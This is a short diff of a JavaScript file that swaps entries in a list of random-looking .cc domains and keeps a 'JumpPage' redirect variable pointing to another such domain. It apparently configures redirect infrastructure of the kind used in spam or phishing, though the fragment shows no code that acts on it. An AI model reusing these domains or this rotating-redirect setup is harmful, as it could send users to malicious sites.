@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
+	'hgolqwecs.cc/', 
 	'enzhremt.cc/', 
-	'satqjahgv.cc/', 
-    'fssaacjq.com/',
+    'satqjahgv.cc/',
 ];                                                                                                                  
 
 var JumpPage="https://atjxcwxet.com";
